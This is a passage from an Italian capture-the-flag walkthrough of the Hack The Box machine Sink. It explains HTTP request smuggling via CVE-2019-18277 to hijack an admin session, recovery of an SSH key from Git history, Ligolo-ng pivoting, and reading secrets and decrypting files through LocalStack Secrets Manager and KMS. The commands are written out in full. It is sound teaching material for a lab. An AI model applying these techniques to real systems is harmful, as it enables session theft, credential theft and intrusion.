4. Se, prima che la connessione scada, un **altro utente reale** (idealmente un account con privilegi — su Sink, l'amministratore) invia una richiesta che finisce instradata sulla stessa connessione riusata verso il backend, Gunicorn la interpreta come la **continuazione** del body di `POST /notes` — non solo il testo, ma l'intera richiesta grezza: request line, header, e soprattutto il **cookie di sessione**.
5. Il risultato viene salvato come nota nell'account dell'attaccante, fino a riempire i byte mancanti dichiarati dal `Content-Length` interno.

Poiché non si ha il controllo su quale connessione del pool viene "sporcata" né su chi la riuserà subito dopo, l'attacco va spesso ripetuto più volte per avere successo — è un meccanismo probabilistico, non deterministico al 100%.

### 4.4 Session hijacking

Ripetendo l'invio della richiesta malformata alcune volte, tra le note create ne è comparsa una contenente l'inizio di una richiesta reale generata dall'amministratore:

```
GET /notes/delete/1234 HTTP/1.1
Host: <target>:5000
User-Agent: Mozilla/5.0 ...
Cookie: session=eyJlbWFpbCI6ImFkbWluQHNpbmsuaHRiIn0.XXXXXX.XXXXXXXXXXXXXXXXXXXXXXXXXXXX
X-Forwa...
```

Il cookie `session` contiene, decodificato, l'email `admin@sink.htb` — la sessione dell'amministratore, rubata tramite request smuggling. Sostituendo il proprio cookie di sessione con questo nel browser (o in Burp), si ottiene accesso come amministratore all'applicazione.

***

## 5. Da admin a marcus tramite Gitea

### 5.1 Git history

Con la sessione admin è possibile accedere all'istanza **Gitea** (porta 3000) come utente con privilegi elevati. Esplorando i repository disponibili, uno in particolare — **Key\_Management** — contiene, nella cronologia dei commit, una **chiave privata SSH** che è stata aggiunta e poi successivamente rimossa in un commit "di pulizia" (visibile confrontando le righe rimosse in rosso e quelle aggiunte in verde nel diff del commit).

### 5.2 Recupero della chiave SSH

La chiave appartiene all'utente `marcus` (è lui l'autore del commit di rimozione). Copiando il contenuto della vecchia revisione (visibile nel diff del commit, la parte in rosso) in un file locale:

```bash
vim id_rsa_marcus
# incollare il contenuto della chiave privata, salvare

chmod 600 id_rsa_marcus
ssh -i id_rsa_marcus marcus@sink.htb
```

Shell ottenuta come `marcus` — e con essa, `user.txt`.

Lo stesso repository contiene anche un file `ec2.php` che referenzia, tra le altre cose, un **ARN di una chiave KMS** (`arn:aws:kms:eu:...:key/...`) — primo indizio dell'infrastruttura AWS/LocalStack usata internamente dalla macchina, che tornerà utile più avanti.

***

## 6. Pivoting con Ligolo-ng

### 6.1 Problema del routing

Per raggiungere servizi interni della macchina (in particolare, un endpoint AWS locale bindato solo su `127.0.0.1`), è stato necessario un tunnel. Con **Ligolo-ng**:

1. Sul proxy (Kali): avvio del listener e caricamento dell'interfaccia TUN.
2. Sull'agent (Sink, eseguito come `marcus`): connessione all'operatore in ascolto.
3. Avvio della sessione tunnel (`start`).

**Errore incontrato e causa:** aggiungendo una rotta verso l'IP reale della macchina target (`ip route add <IP-di-Sink>/32 dev ligolo`), il tunnel cadeva ripetutamente subito dopo l'avvio (`Agent dropped`, riconnessioni continue). Il motivo: quell'IP è lo stesso usato dalla connessione di controllo tra agent e proxy. Instradare quel traffico dentro il tunnel stesso crea un loop — il traffico della connessione di controllo finisce redirezionato dentro il tunnel che dipende da quella stessa connessione per esistere.

**Soluzione**: le rotte vanno aggiunte solo per **reti nuove**, effettivamente dietro il pivot (host non raggiungibili direttamente) — mai per l'IP della macchina che ospita l'agent stesso.

### 6.2 Accesso a localhost tramite 240.0.0.1

Per raggiungere un servizio bindato solo su `127.0.0.1` **sulla macchina target stessa** (non su un host diverso dietro di lei), Ligolo-ng offre un indirizzo "magico" dedicato:

```bash
sudo ip route add 240.0.0.1/32 dev ligolo
```

Interrogando `240.0.0.1` invece dell'IP reale, il traffico viene automaticamente redirezionato verso `127.0.0.1` **dal punto di vista dell'agent** — permettendo di raggiungere porte interne senza creare il loop visto sopra.

Verifica pratica:

```bash
nc -zv 240.0.0.1 4566
# 4566 open — il servizio interno risponde attraverso il tunnel
```

***

## 7. Enumerazione AWS LocalStack

Sulla macchina risultava installato l'AWS CLI e, in ascolto solo su localhost, un'istanza di **LocalStack** (una simulazione locale di AWS, usata qui per test/sviluppo — non l'AWS reale su internet).

Configurazione della CLI per puntare all'endpoint locale (attraverso il tunnel):

```bash
alias aws='aws --endpoint-url=http://240.0.0.1:4566'
aws configure   # richiede comunque una region, es. us-east-1, e le chiavi trovate nei repo Gitea
```

Provando i comandi base (`aws sts get-caller-identity`, `aws iam list-users`, `aws organizations list-accounts`) tutti restituivano errori — non per mancanza di permessi, ma perché **quei servizi non erano affatto attivi** su questa istanza LocalStack. Solo due servizi risultavano realmente funzionanti: **KMS** e **Secrets Manager**.

Per chi vede AWS per la prima volta, un riferimento veloce: **account** = il contenitore completo di utenti/permessi/risorse; **region** = il data center fisico dove vivono le risorse; **IAM** = gestisce utenti e ruoli (un **ruolo** è un'identità temporanea, ottenuta tramite **STS**); **Secrets Manager** = contenitore per credenziali di servizi esterni; **KMS** = gestisce chiavi di crittografia (cifratura/decifratura o firma digitale).

### 7.1 Secrets Manager

```bash
aws secretsmanager list-secrets --region us-east-1
```

Tre segreti disponibili: `Sink Panel`, `Jenkins Login`, `Jira Support`. Leggendo il valore di ciascuno:

```bash
aws secretsmanager get-secret-value --secret-id "Sink Panel" --region us-east-1
aws secretsmanager get-secret-value --secret-id "Jenkins Login" --region us-east-1
aws secretsmanager get-secret-value --secret-id "Jira Support" --region us-east-1
```

Credenziali in chiaro recuperate per tre utenti diversi (username + password), tra cui quelle dell'utente `david` — password ricavata dal segreto `Jira Support`.

### 7.2 Recupero delle credenziali di david

Da `marcus`, cambio utente:

```bash
su david
```

Nella home di `david`, dentro `Projects/Prod_Deployment/`, un file `servers.enc` — dati binari, non testo leggibile, chiaramente cifrati.

### 7.3 KMS

```bash
aws kms list-keys --region us-east-1
```

Undici chiavi elencate (solo ID/ARN, nessun materiale crittografico esposto direttamente — per design). Interrogando policy e dettagli di ciascuna:

```bash
for keyid in $(cat lista_key_id); do
  echo "--- $keyid ---"
  aws kms describe-key --key-id "$keyid" --region us-east-1
done
```

La maggior parte condivide la stessa policy di default permissiva (`"Action": "kms:*"` concesso al root dell'account). Tra le chiavi, una in particolare — `804125db-bdf1-465a-a058-07fc87c0fad0` — risulta **abilitata**, di tipo `RSA_4096`, pensata esplicitamente per operazioni di cifratura/decifratura (a differenza di altre chiavi nel set, orientate invece alla firma digitale).

### 7.4 Decrittazione di servers.enc

```bash
aws kms decrypt \
  --ciphertext-blob fileb://servers.enc \
  --key-id 804125db-bdf1-465a-a058-07fc87c0fad0 \
  --region us-east-1 \
  --encryption-algorithm RSAES_OAEP_SHA_256
```

L'output contiene un campo `Plaintext` in base64. Decodificandolo:

```bash
echo "<Plaintext>" | base64 -d
```

Il risultato non è testo leggibile direttamente — i primi byte (`H4sI` in base64, corrispondenti a `1f 8b 08` in esadecimale) sono la firma tipica di un archivio **gzip**. Ma non basta il solo `gunzip`: quello che c'è dentro è in realtà un **tar** compresso — decomprimendo si vede infatti l'intestazione tipica di un file tar (nome file, permessi, timestamp) prima del contenuto vero. Il modo pulito per estrarre tutto in un solo passaggio:

```bash
echo "<Plaintext>" | base64 -d | tar -xzO
```

### 7.5 Recupero delle credenziali root

Il tar estratto contiene `servers.yml`, con dentro le credenziali di un utente amministrativo del servizio (host `vault.sink.htb`), usate poi per arrivare a **root** sulla macchina.

> **Approfondimento — strumenti per AWS pentesting.** Non usati direttamente su questa macchina, ma parte del panorama offensive su AWS: **Pacu** (exploitation attiva di privilege escalation IAM), **ScoutSuite** e **Prowler** (audit/mappatura delle misconfigurazioni), **PMapper** (il "BloodHound" di AWS, grafo dei percorsi di escalation), **cloud\_enum** (scoperta di bucket/risorse pubbliche per nome azienda). Guide operative complete: [AWS Pentesting: IAM, S3, EC2, IMDS e Privilege Escalation](https://hackita.it/articoli/aws-security/) e [AWS Privilege Escalation](https://hackita.it/articoli/aws-privilege-escalation/) su Hackita.

***

## 8. Root

Con le credenziali recuperate dal file decifrato, accesso come `root` (via `su root` o SSH diretto), e lettura di `root.txt` per chiudere la macchina.

***

## 9. Riepilogo del percorso

```
Recon (HAProxy + Gunicorn dietro Flask, Gitea esposto)
        ↓
Studio del bug CVE-2019-18277 (CL/TE mismatch, byte \x0b)
        ↓
Costruzione ed esecuzione dell'exploit di smuggling
  (richiesta con CL/TE in conflitto + chunk 0 + POST /notes nascosta)
        ↓
Cattura della sessione admin (tramite riuso della connessione keep-alive)
        ↓
Accesso a Gitea come admin → chiave SSH di marcus nella cronologia commit
        ↓
Shell come marcus (user.txt)
        ↓
Tunneling con Ligolo-ng (attenzione al loop di routing, uso di 240.0.0.1)
        ↓
Enumerazione LocalStack: solo KMS e Secrets Manager attivi
        ↓
Credenziali di david da Secrets Manager → su david
        ↓
File servers.enc cifrato → chiave KMS RSA corretta → decrypt → estrazione tar
        ↓
Credenziali nel file estratto (servers.yml) → root → root.txt
```

***

## 10. Vulnerabilità e tecniche utilizzate

| Tecnica                | Utilizzo                                                   |
| ---------------------- | ---------------------------------------------------------- |
| HTTP Request Smuggling | Desync del parsing tra HAProxy e Gunicorn                  |
| CVE-2019-18277         | Trigger dello smuggling (byte `\x0b` in Transfer-Encoding) |
| Session hijacking      | Furto della sessione admin tramite connection reuse        |
| Gitea Git history      | Recupero della chiave SSH di marcus                        |
| Ligolo-ng              | Pivot verso il servizio LocalStack interno                 |
| AWS Secrets Manager    | Recupero credenziali di david                              |
| AWS KMS                | Decrittazione di `servers.enc`                             |
| LocalStack             | Enumerazione dei servizi AWS locali                        |

***

## 11. Cosa imparare da HTB Sink

* Il conflitto di request smuggling nasce **sempre** da un disaccordo tra due server sulla stessa richiesta: uno segue Content-Length, l'altro Transfer-Encoding (o entrambi TE, ma uno dei due viene ingannato a non riconoscerlo).
* Un carattere di controllo apparentemente innocuo (`\x0b`, `\x0c`) inserito in un punto preciso di un header può bastare a rompere il parsing di un solo lato della catena, senza che l'altro lato se ne accorga.
* Il bug del front-end da solo non basta: serve un bug complementare anche sul backend (che accetti quello che dovrebbe rifiutare secondo RFC 7230).
* La connessione persistente riusata tra front-end e backend è ciò che trasforma un semplice parsing error in un vettore per rubare dati di altri utenti.
* Verificare la vulnerabilità richiede un test "pulito" che isoli la sola variabile del bug (con/senza il carattere che lo attiva) — un timeout ottenuto con un payload già di per sé malformato non prova nulla, e anche il test pulito resta un indizio probabilistico, non una certezza assoluta.
* Un punto d'appoggio che mostri il risultato (un campo di testo salvato e visualizzabile) rende l'intero processo enormemente più semplice da verificare rispetto a un attacco puramente "blind".

***

## FAQ

**Cos'è HTB Sink?**
Sink è una macchina Linux di Hack The Box, classificata Insane, che mette in scena un'infrastruttura reale con reverse proxy (HAProxy), application server Python (Gunicorn), un'istanza Gitea e un ambiente AWS simulato con LocalStack.

**Quale vulnerabilità viene sfruttata in HTB Sink?**
Il percorso principale sfrutta l'HTTP Request Smuggling legato a CVE-2019-18277: un byte di controllo nascosto nell'header `Transfer-Encoding` fa sì che HAProxy e Gunicorn interpretino la stessa richiesta in modo diverso.

**Come si ottiene la sessione admin su Sink?**
Attraverso il request smuggling: una richiesta nascosta resta "in attesa" sulla connessione condivisa tra HAProxy e Gunicorn, e la richiesta successiva di un altro utente — idealmente l'amministratore — viene catturata e salvata come nota.

**Come si passa da admin a marcus?**
Accedendo a Gitea con la sessione admin rubata e recuperando una chiave SSH privata dalla cronologia dei commit di un repository.

**Come si arriva a root?**
Tramite Secrets Manager (credenziali di david) e KMS (decrittazione di un file di configurazione contenente le credenziali root), su un'istanza LocalStack raggiunta tramite tunnel Ligolo-ng.
